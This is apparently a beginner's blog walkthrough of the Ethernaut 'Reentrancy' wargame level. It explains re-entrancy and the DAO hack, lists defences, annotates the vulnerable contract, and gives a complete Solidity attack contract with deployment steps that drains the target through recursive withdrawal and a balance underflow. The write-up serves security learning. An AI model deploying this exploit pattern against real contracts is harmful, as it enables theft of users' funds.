---
title: "Ethernaut - Walkthrough for Noobs - 10 - Reentrancy"
datePublished: Thu Mar 23 2023 18:57:52 GMT+0000 (Coordinated Universal Time)
cuid: clflh7gsi000009jwe0fb055t
slug: ethernaut-walkthrough-for-noobs-10-reentrancy
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1679499816268/0b1f0a67-318d-42a6-9ff9-a58200778b8c.jpeg
tags: ethereum, smart-contracts, 2articles1week, ethernaut, reentrancy

---

This challenge is a good one. We learn about the famous re-entrancy attack. This attack was responsible for the infamous '[The DAO Hack](https://blog.chain.link/reentrancy-attacks-and-the-dao-hack/)'. It is the reason why there was a hard fork on the Ethereum chain and we now have two chains, the legacy chain - Ethereum Classic, and the Ethereum chain that we know today.

You can and should read more about the 'The DAO Hack'. These types of attacks today are relatively less heard of but nonetheless, played a pivotal role in building the smart contract security and auditing space.

> Objective: The goal of this level is for you to steal all the funds from the contract.

### Background

A Re-entrancy is a type of vulnerability in a contract, in which the vulnerable contract gives up the control flow and makes an external call to a contract. This receiver contract can sometimes be malicious and can make recursive calls back to the vulnerable smart contract to drain its funds or claim ownership.

To further dumb it down, this is how the attack would take place.

1. Let's say there are two contracts: A --&gt; Vulnerable and B --&gt; Attacker.
    
2. The bad guy, let's say Aditya(Me) would invoke contract A to send funds to the malicious contract B.
    
3. Contract A would do its diligence, it would check Aditya's balance --&gt; send funds to B ---&gt; Updates the Balance.
    
4. However, the malicious contract wouldn't have a `receive` function but rather a fallback function, which would call back recursively into contract A before it updates the funds. Hence the Exploit.
    

Concentrate on the word re-entrancy, i.e. to re-enter the contract. I don't know if this fact is true tho, making shit up at this point.

To some up, B calls recursively into A before A finishes its execution.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1679506065722/ff15249e-ad81-4ff4-baff-562631e98374.png align="center")

So, how would you identify if a re-entrancy attack is possible?

1. There must be an **external call** happening in the contract to another contract owned by the bad actor.
    
2. There is some sensitive **state change**, for example: in the above example: the balanceUpdate() is that state change.
    

> *Note: The common ways to prevent re-entrancy attacks are:*
> 
> 1. *Checks, Effects, and Interactions (CEI) method.*
>     
> 2. *Reentrancy Guard or Mutex*
>     
> 3. *Gas Limit*
>     
> 4. *Pull Payments*
>     
> 
> [Read more](https://www.alchemy.com/overviews/reentrancy-attack-solidity)

### Code of Importance

Per usual, the explanations are in the comments.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol'; //imports SafeMath. 

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances; //maps the user balance to its address.

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value); //allows msg.sender to send funds to this address, we would need to send some funds here for to pass an if statement in the withdraw() function. 
//Also since it uses SafeMath, it won't overflow. Remember? Challenge 3?
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who]; //checks the balance, nothing special. 
  }
//here comes the point of attack. 
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) { //checks for balance of msg.sender
      (bool result,) = msg.sender.call{value:_amount}(""); //sends the requested _amount via the call function.
//this is bad, since the msg.sender can be the malicious contract. That is a no no. 
      if(result) {
        _amount; //checks for whether the amount was sent successfully. 
      }
      balances[msg.sender] -= _amount; //this is the sensitive state change we were talking about. 
    }
  }

  receive() external payable {} //receives ether
}
```

Here is the plan of attack.

1. Deploy a malicious contract with some balance.
    
2. Use that contract to call the level instance.
    
3. Donate some ether to the level instance, to pass the if statement.
    
4. The malicious contract will have a fallback function that will help us reenter the `withdraw` function before the balance gets updated. Hence calling it recursively again and again.
    

### Solution

I have laid out all the steps for you to solve it the standard way, I am solving it in a non-standard and **lengthier** way just to show how we can even make the Reentrance contract underflow, for you, however, use the standard procedure to solve the problem. Figure it out, that's a take-home challenge.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IReentrance { //an interface to interact with the Reentrance contract, basically to reduce code duplication and also I am too lazy, to copy paste, and change the compiler version on Remix.   
    function donate(address _to) external payable; 
    function withdraw(uint _amount) external;
}

contract Malicious {
    //state variables
    IReentrance reentrance;
    bool private success;
    address public targetAddress;

    constructor(address _targetAddress) {
        reentrance = IReentrance(_targetAddress); 
        success = false; //will use as a check to stop the exploit from an infinte recursion. 
        targetAddress = _targetAddress;
    }

    function attack() external payable {
        reentrance.donate{value: msg.value}(address(this)); //we will donate to the contract, to pass the checks in the withdraw function. `this` referes to the address of Malicious.

        reentrance.withdraw(msg.value); //We will withdraw our amount (1 wei), this will trigger the receive function. Balance is updated to zero. (Step 1)
        reentrance.withdraw(address(targetAddress).balance); //We have an infinte amount of balance theoritcally, and can withdraw all the funds in the Reentrance contract. (Step 3)

    }

    receive() external payable {
        
        if (!success) { //since success is false, this will continue
            success = true; //setting it to be true. Hence the re-entrance will stop after one time. 
            reentrance.withdraw(msg.value); //Withdrawing (1 wei again) Balance underflows. (Step 2)
        }
    }
}
```

1. Put the above code in Remix, Compile it, and Deploy it on the Level instance.
    
2. Put `1 wei` as: value in Remix, and fire the attack function.
    
3. ```javascript
    await getBalance(contract.address) //should be zero, if you have passed the challenge.
    ```
    
4. Submit Instance
    

Re-entrancy **🚪**